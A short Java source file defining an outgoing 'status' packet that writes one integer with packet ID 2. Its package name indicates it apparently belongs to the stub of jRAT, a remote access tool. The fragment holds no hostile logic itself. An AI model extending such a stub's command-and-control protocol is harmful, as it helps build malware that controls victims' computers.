package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet2Status extends AbstractOutgoingPacket {

	private int status;

	public Packet2Status(int status) {
		this.status = status;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(status);
	}

	@Override
	public byte getPacketId() {
		return (byte) 2;
	}

}
